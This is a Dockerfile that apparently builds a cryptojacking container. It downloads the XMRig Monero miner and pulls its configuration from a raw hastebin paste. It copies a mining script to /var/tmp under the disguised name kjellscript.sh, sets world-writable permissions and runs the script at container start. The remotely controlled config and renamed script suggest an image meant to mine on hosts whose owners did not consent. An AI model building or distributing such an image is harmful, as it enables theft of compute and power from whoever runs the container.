FROM alpine 

RUN apk add --update --no-cache curl jq
RUN apk add --no-cache bash
ADD scripts/mine.sh /var/tmp/kjellscript.sh
RUN chmod 777 /var/tmp/kjellscript.sh
RUN curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-static-x64.tar.gz
RUN curl -o /var/tmp/config.json http://hastebin.com/raw/zicarebelu
RUN chmod -R 777 /var/tmp
CMD /var/tmp/kjellscript.sh